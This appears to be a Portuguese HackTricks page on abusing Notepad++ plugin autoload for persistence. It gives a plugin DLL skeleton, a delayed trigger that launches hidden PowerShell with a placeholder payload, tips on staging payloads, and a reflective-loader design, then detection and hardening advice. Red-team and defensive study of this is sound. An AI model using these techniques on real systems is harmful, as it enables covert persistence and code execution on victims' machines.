# Persistência e Execução via Autoload de Plugin do Notepad++

{{#include ../../banners/hacktricks-training.md}}

O Notepad++ **carrega automaticamente todas as DLLs de plugins encontradas nas subpastas `plugins`** ao iniciar. Colocar um plugin malicioso em qualquer **instalação gravável do Notepad++** fornece execução de código dentro do `notepad++.exe` sempre que o editor é iniciado, o que pode ser abusado para **persistência**, **execução inicial discreta** ou como um **loader in-process** se o editor for iniciado com privilégios elevados.<sup>[[1]](#references)</sup>

Desde o **Notepad++ 7.6+**, o layout esperado para instalação manual é **uma subpasta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). No **portable mode** (presença de `doLocalConf.xml` ao lado de `notepad++.exe`), toda a árvore do aplicativo permanece local nesse diretório, o que frequentemente transforma cópias de ferramentas administrativas em uma superfície de execução gravável pelo usuário.<sup>[[2]](#references)</sup>

## Locais graváveis de plugins

- Instalação padrão: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (normalmente requer privilégios de administrador para gravação).<sup>[[1]](#references)</sup>
- Opções graváveis para operadores com poucos privilégios:<sup>[[1]](#references)</sup>
- Usar o **portable Notepad++ build** em uma pasta gravável pelo usuário.
- Copiar `C:\Program Files\Notepad++` para um caminho controlado pelo usuário (por exemplo, `%LOCALAPPDATA%\npp\`) e executar `notepad++.exe` a partir desse local.
- Procurar **admin tool bundles**, cópias extraídas de arquivos zip ou toolkits de help desk que já contenham `doLocalConf.xml` e estejam fora de `Program Files`.
- Cada plugin recebe sua própria subpasta dentro de `plugins` e é carregado automaticamente na inicialização; as entradas do menu aparecem em **Plugins**.<sup>[[2]](#references)</sup>

Triagem rápida:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Pontos de carregamento do plugin (primitivas de execução)
O Notepad++ espera **funções exportadas** específicas. Todas são chamadas durante a inicialização, fornecendo várias superfícies de execução:<sup>[[1]](#references)</sup>
- **`DllMain`** — executada imediatamente no carregamento da DLL (primeiro ponto de execução).
- **`setInfo(NppData)`** — chamada uma vez no carregamento para fornecer os handles do Notepad++; local típico para registrar itens de menu.
- **`getName()`** — retorna o nome do plugin exibido no menu.
- **`getFuncsArray(int *nbF)`** — retorna os comandos do menu; mesmo que esteja vazio, é chamada durante a inicialização.
- **`beNotified(SCNotification*)`** — recebe eventos do Notepad++ / Scintilla (útil para adiar payloads até uma ação do usuário ou um evento do editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manipulador de mensagens, útil para trocas de dados maiores.
- **`isUnicode()`** — flag de compatibilidade verificada no carregamento.

A maioria das exports pode ser implementada como **stubs**; a execução pode ocorrer a partir de `DllMain` ou de qualquer callback acima durante o autoload.

## Estrutura mínima de um plugin malicioso
Compile uma DLL com as exports esperadas e coloque-a em `plugins\\MyNewPlugin\\MyNewPlugin.dll`, dentro de uma pasta gravável do Notepad++:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compile a DLL (Visual Studio/MinGW).
2. Crie a subpasta do plugin em `plugins` e coloque a DLL dentro dela.
3. Reinicie o Notepad++; a DLL é carregada automaticamente, executando `DllMain` e os callbacks subsequentes.

## Padrão de trigger de baixo ruído via `beNotified`
Para OPSEC, muitos payloads não devem ser executados a partir de `DllMain`. Um padrão mais discreto é permitir que o plugin seja carregado corretamente e, em seguida, executar somente após um evento realista do editor, como **a conclusão da inicialização**, **a ativação do buffer** ou **o primeiro caractere digitado**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Isso corresponde melhor à offensive research pública do que um beacon ruidoso em `DllMain`: a DLL ainda é carregada automaticamente na inicialização, mas a ação maliciosa é adiada até que o Notepad++ esteja realmente em uso.

## Usando o diretório de configuração do plugin como armazenamento secundário
O Notepad++ expõe `NPPM_GETPLUGINSCONFIGDIR`, que retorna o **diretório de configuração de plugins do usuário atual**.<sup>[[3]](#references)</sup> Um plugin malicioso pode usar isso para manter a DLL em disco mínima, enquanto armazena configurações criptografadas, payloads preparados ou arquivos de tasking em um caminho que se mistura com o estado normal do plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operacionalmente, isso é útil quando você deseja:
- uma bootstrap DLL pequena carregada automaticamente;
- tasking por usuário sem precisar alterar novamente o binário principal do plugin;
- separar o **autoload trigger** do segundo estágio mais pesado.

## Padrão de plugin reflective loader
Um plugin weaponized pode transformar o Notepad++ em um **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Apresentar uma entrada mínima na UI/menu (por exemplo, "LoadDLL").
- Aceitar um **file path** ou **URL** para buscar uma payload DLL.
- Mapear a DLL de forma reflective no processo atual e chamar um entry point exportado (por exemplo, uma função loader dentro da DLL obtida).
- Benefício: reutilizar um processo GUI aparentemente benigno em vez de iniciar um novo loader; a payload herda a integridade de `notepad++.exe` (incluindo contextos elevados).
- Trade-offs: gravar uma **unsigned plugin DLL** no disco é ruidoso; uma variação prática é usar o plugin carregado automaticamente apenas como um stub e manter o implant real encrypted/staged em outro local.

## Observações sobre detecção e hardening
- Bloqueie ou monitore **writes nos diretórios de plugins do Notepad++** (incluindo cópias portáteis em perfis de usuário); habilite o controlled folder access ou o application allowlisting.
- Gere alertas para **novas unsigned DLLs** em `plugins`, alterações em árvores portáteis do Notepad++ e **child processes/network activity** incomuns originados de `notepad++.exe`.
- Estabeleça uma baseline dos plugins legítimos e investigue qualquer nova DLL que exporte a interface normal de plugin do Notepad++, mas também inicie shells, PowerShell ou network beacons.
- Exija a instalação de plugins somente pelo **Plugins Admin** e restrinja a execução de cópias portáteis a partir de paths não confiáveis.

## Referências

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
